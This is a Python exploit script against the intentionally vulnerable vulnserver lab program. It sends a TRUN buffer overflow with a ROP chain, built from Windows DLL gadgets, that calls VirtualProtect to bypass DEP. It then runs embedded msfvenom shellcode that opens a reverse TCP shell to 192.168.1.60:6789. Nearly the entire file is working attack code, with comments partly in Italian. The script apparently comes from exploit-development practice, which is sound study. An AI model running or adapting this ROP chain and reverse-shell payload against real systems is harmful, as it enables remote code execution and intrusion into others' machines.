#based on https://connormcgarr.github.io/ROP/
import struct 
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999
target = (TARGET_IP, TARGET_PORT)  # vulnserver

VULNSRVR_CMD = b"TRUN ."  
CRASH_LEN = 6000 
OFFSET = 2006  

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.60 LPORT=6789  -f python -v shellcode -b '\x00\x09\x0A' EXITFUNC=thread
shellcode =  b""
shellcode += b"\xda\xcb\xba\xdd\xd8\x47\xd0\xd9\x74\x24\xf4"
shellcode += b"\x5b\x29\xc9\xb1\x52\x31\x53\x17\x03\x53\x17"
shellcode += b"\x83\x36\x24\xa5\x25\x34\x3d\xa8\xc6\xc4\xbe"
shellcode += b"\xcd\x4f\x21\x8f\xcd\x34\x22\xa0\xfd\x3f\x66"
shellcode += b"\x4d\x75\x6d\x92\xc6\xfb\xba\x95\x6f\xb1\x9c"
shellcode += b"\x98\x70\xea\xdd\xbb\xf2\xf1\x31\x1b\xca\x39"
shellcode += b"\x44\x5a\x0b\x27\xa5\x0e\xc4\x23\x18\xbe\x61"
shellcode += b"\x79\xa1\x35\x39\x6f\xa1\xaa\x8a\x8e\x80\x7d"
shellcode += b"\x80\xc8\x02\x7c\x45\x61\x0b\x66\x8a\x4c\xc5"
shellcode += b"\x1d\x78\x3a\xd4\xf7\xb0\xc3\x7b\x36\x7d\x36"
shellcode += b"\x85\x7f\xba\xa9\xf0\x89\xb8\x54\x03\x4e\xc2"
shellcode += b"\x82\x86\x54\x64\x40\x30\xb0\x94\x85\xa7\x33"
shellcode += b"\x9a\x62\xa3\x1b\xbf\x75\x60\x10\xbb\xfe\x87"
shellcode += b"\xf6\x4d\x44\xac\xd2\x16\x1e\xcd\x43\xf3\xf1"
shellcode += b"\xf2\x93\x5c\xad\x56\xd8\x71\xba\xea\x83\x1d"
shellcode += b"\x0f\xc7\x3b\xde\x07\x50\x48\xec\x88\xca\xc6"
shellcode += b"\x5c\x40\xd5\x11\xa2\x7b\xa1\x8d\x5d\x84\xd2"
shellcode += b"\x84\x99\xd0\x82\xbe\x08\x59\x49\x3e\xb4\x8c"
shellcode += b"\xde\x6e\x1a\x7f\x9f\xde\xda\x2f\x77\x34\xd5"
shellcode += b"\x10\x67\x37\x3f\x39\x02\xc2\xa8\x86\x7b\xcd"
shellcode += b"\x14\x6f\x7e\xcd\x7e\xea\xf7\x2b\x14\xe4\x51"
shellcode += b"\xe4\x81\x9d\xfb\x7e\x33\x61\xd6\xfb\x73\xe9"
shellcode += b"\xd5\xfc\x3a\x1a\x93\xee\xab\xea\xee\x4c\x7d"
shellcode += b"\xf4\xc4\xf8\xe1\x67\x83\xf8\x6c\x94\x1c\xaf"
shellcode += b"\x39\x6a\x55\x25\xd4\xd5\xcf\x5b\x25\x83\x28"
shellcode += b"\xdf\xf2\x70\xb6\xde\x77\xcc\x9c\xf0\x41\xcd"
shellcode += b"\x98\xa4\x1d\x98\x76\x12\xd8\x72\x39\xcc\xb2"
shellcode += b"\x29\x93\x98\x43\x02\x24\xde\x4b\x4f\xd2\x3e"
shellcode += b"\xfd\x26\xa3\x41\x32\xaf\x23\x3a\x2e\x4f\xcb"
shellcode += b"\x91\xea\x6f\x2e\x33\x07\x18\xf7\xd6\xaa\x45"
shellcode += b"\x08\x0d\xe8\x73\x8b\xa7\x91\x87\x93\xc2\x94"
shellcode += b"\xcc\x13\x3f\xe5\x5d\xf6\x3f\x5a\x5d\xd3"

rop_nop = struct.pack("<I",0x62501022) # ROP NOP

payload = VULNSRVR_CMD
payload += b"A" * OFFSET
payload += rop_nop 

# Beginning of ROP chain

# Saving ESP into ESI, EAX e EDX
payload += struct.pack('<L', 0x77371b2e)  # PUSH ESP # POP ESI # RETN    ** [KERNEL32.DLL] **  
payload += struct.pack('<L', 0x75c74c67)  # MOV EAX,ESI # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x75d18224)  # MOV EDX,EAX # MOV EAX,EDX # RETN ** RPCRT4

payload += struct.pack('<L', 0x75c481cc)  # ADD ESP,2C # RETN **msvcrt**

# Calling VirtualProtect with parameters
payload += struct.pack('<L', 0x77325c90)    # kernel32.VirtualProtect()
payload += struct.pack('<L', 0x4c4c4c4c)    # return address (address of shellcode, or where to jump after VirtualProtect call. Not officially apart of the "parameters"
payload += struct.pack('<L', 0x45454545)    # lpAddress
payload += struct.pack('<L', 0x03030303)    # size of shellcode
payload += struct.pack('<L', 0x54545454)    # flNewProtect
payload += struct.pack('<L', 0x62506d10)    # pOldProtect (any writeable address)

payload += b"\x90" * 20

#con add esp,2c atterro qui
# Increase ESI 72 bytes (ESI right now contains old ESP) to equal address of the VirtualProtect return address place holder
# (no pointers have been created yet)
payload += struct.pack('<L',0x75c7d3aa)  # INC ESI # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x75c7d3aa)  # INC ESI # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x75c7d3aa)  # INC ESI # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x75c7d3aa)  # INC ESI # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x75c7d3aa)  # INC ESI # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x75c7d3aa)  # INC ESI # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x75c7d3aa)  # INC ESI # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x75c7d3aa)  # INC ESI # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x75c7d3aa)  # INC ESI # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x75c7d3aa)  # INC ESI # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x75c7d3aa)  # INC ESI # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x75c7d3aa)  # INC ESI # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x75c7d3aa)  # INC ESI # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x75c7d3aa)  # INC ESI # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x75c7d3aa)  # INC ESI # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x75c7d3aa)  # INC ESI # RETN    ** [RPCRT4.dll] ** 

# Move ESI into ECX, and increase it 4 bytes to reach location of VirtualProtect lpAddress parameter
# (no pointers have been created yet. Just preparation)
# Now EAX contains the address of the VirtualProtect return address
# Now ESI contains the address of the VirtualProtect return address
# Now ECX, contains the address of the VirtualProtect lpAddress location
payload += struct.pack('<L',0x75cf0bd8) # MOV ECX,ESI # MOV EAX,ECX # POP ESI # POP EBP # RETN 0x04 **RPCRT4**
payload += struct.pack ('<L', 0x50505050)  # padding to compensate for pop esi in the above ROP gadget
payload += struct.pack ('<L', 0x50505050)  # padding to compensate for pop ebp in the above ROP gadget
payload += rop_nop # retn 0x04
payload += rop_nop # retn 0x04
payload += struct.pack('<L',0x75bc0778) # INC ECX # RETN    ** [msvcrt.dll] ** 
payload += struct.pack('<L',0x75bc0778) # INC ECX # RETN    ** [msvcrt.dll] ** 
payload += struct.pack('<L',0x75bc0778) # INC ECX # RETN    ** [msvcrt.dll] ** 
payload += struct.pack('<L',0x75bc0778) # INC ECX # RETN    ** [msvcrt.dll] ** 

# Increase EDX, which contains old ESP, to equal around the address of shellcode
# Determine how far shellcode is away, and add that difference into EDX, because
# EDX is being used for calculations
payload += struct.pack('<L',0x774c40e4)  # ADD EDX,96 # ADD EAX,EDX # RETN  **ntdll**
payload += struct.pack('<L',0x774c40e4)  # ADD EDX,96 # ADD EAX,EDX # RETN  **ntdll**
payload += struct.pack('<L',0x774c40e4)  # ADD EDX,96 # ADD EAX,EDX # RETN  **ntdll**

#visto che sia EAX che ESI li perdo ma dovrebbero contenere il return address, mi salvo una copia di ECX
#in EAX e decremento EAX di 4
payload += struct.pack('<L',0x774d80f8)  # MOV EAX,ECX # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] **  
payload += struct.pack('<L',0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] **  
payload += struct.pack('<L',0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] **  
payload += struct.pack('<L',0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] **  

# Replace current VirtualProtect return address pointer (the placeholder) 
#with pointer to shellcode location 
#EDX --> [EAX]
payload += struct.pack('<L',0x75d7d2c1)  # MOV DWORD PTR [EAX],EDX # POP EBP # RETN 0x08    ** [WS2_32.DLL] **  
payload += rop_nop # retn 0x08
payload += rop_nop # retn 0x08
payload += rop_nop # retn 0x08
payload += rop_nop # retn 0x08

# Replace VirtualProtect lpAddress placeholder with pointer to shellcode location
# EDX --> [ECX]
payload += struct.pack('<L',0x7734b3f6)  # MOV DWORD PTR [ECX],EDX # POP EBP # RETN 0x04    ** [KERNEL32.DLL] **  
payload += struct.pack ('<L', 0x50505050)  # padding to compensate for pop ebp
payload += rop_nop # retn 0x04
payload += rop_nop # retn 0x04

#Replace VirtualProtect size placeholder with 0x365
#salvo eax in edx
payload += struct.pack('<L',0x75d18224)  # MOV EDX,EAX # MOV EAX,EDX # RETN    ** [RPCRT4.dll] **  
#pulisco eax e ci butto dentro 365
payload += struct.pack('<L',0x75c795df)  # XOR EAX,EAX # RETN    ** [RPCRT4.dll] ** 
payload += struct.pack('<L',0x7735030e)  # ADD EAX,16D # POP EBP # RETN 0x04 **KERNEL32**  
payload += struct.pack ('<L', 0x50505050)  # padding to compensate for pop ebp
payload += rop_nop # retn 0x04
payload += rop_nop # retn 0x04
#aumento edx fino a farlo arrivare al pointer di size
payload += struct.pack('<L',0x75c258b7)  # INC EDX # RETN    ** [msvcrt.dll] **
payload += struct.pack('<L',0x75c258b7)  # INC EDX # RETN    ** [msvcrt.dll] **
payload += struct.pack('<L',0x75c258b7)  # INC EDX # RETN    ** [msvcrt.dll] **
payload += struct.pack('<L',0x75c258b7)  # INC EDX # RETN    ** [msvcrt.dll] **
payload += struct.pack('<L',0x75c258b7)  # INC EDX # RETN    ** [msvcrt.dll] **
payload += struct.pack('<L',0x75c258b7)  # INC EDX # RETN    ** [msvcrt.dll] **
payload += struct.pack('<L',0x75c258b7)  # INC EDX # RETN    ** [msvcrt.dll] **
payload += struct.pack('<L',0x75c258b7)  # INC EDX # RETN    ** [msvcrt.dll] **
#copio eax nel pointer di edx
payload += struct.pack('<L',0x75c078a1)  # MOV DWORD PTR [EDX],EAX # MOV EAX,3 # RETN    ** [msvcrt.dll] **

#Replace VirtualProtect lfProtect placeholder with 0x40
#pulisco eax
payload += struct.pack('<L',0x75c795df)  # XOR EAX,EAX # RETN    ** [RPCRT4.dll] **
#aggiungo 44 e decremento di 4
payload += struct.pack('<L',0x75be28d8) # ADD EAX,20 # POP EBP # RETN  **msvcrt**  
payload += struct.pack('<L',0x50505050)  # padding to compensate for pop ebp
payload += struct.pack('<L',0x75be28d8) # ADD EAX,20 # POP EBP # RETN  **msvcrt**  
payload += struct.pack('<L',0x50505050)  # padding to compensate for pop ebp
#aumento edx di 4
payload += struct.pack('<L',0x75c258b7)  # INC EDX # RETN    ** [msvcrt.dll] **
payload += struct.pack('<L',0x75c258b7)  # INC EDX # RETN    ** [msvcrt.dll] **
payload += struct.pack('<L',0x75c258b7)  # INC EDX # RETN    ** [msvcrt.dll] **
payload += struct.pack('<L',0x75c258b7)  # INC EDX # RETN    ** [msvcrt.dll] **
#copio eax nel pointer di edx
payload += struct.pack('<L',0x75c078a1)  # MOV DWORD PTR [EDX],EAX # MOV EAX,3 # RETN    ** [msvcrt.dll] **


# Now we need to return to where the VirutalProtect call is on the stack.
# ECX contains a value around the old stack pointer at this time (from the beginning). Put ECX into EAX
# and decrement EAX to get back to the function call - and then load EAX into ESP.
# Restoring the old stack pointer here.
payload += struct.pack('<L',0x774d80f8)  # MOV EAX,ECX # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] **
payload += struct.pack('<L',0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] **
payload += struct.pack('<L',0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] **
payload += struct.pack('<L',0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] **
payload += struct.pack('<L',0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] **
payload += struct.pack('<L',0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] **
payload += struct.pack('<L',0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] **
payload += struct.pack('<L',0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] **
payload += struct.pack('<L',0x77318010)  # XCHG EAX,ESP # RETN    **


payload += b"\x90" * 250  # padding for the ROP gadget that will be insterted

payload +=shellcode

payload += b"C" * (CRASH_LEN - len(payload))

with socket.create_connection(target) as sock:
    sock.recv(512)  # Welcome to Vulnerable Server! ... 

    sent = sock.send(payload)
    print(f"sent {sent} bytes")
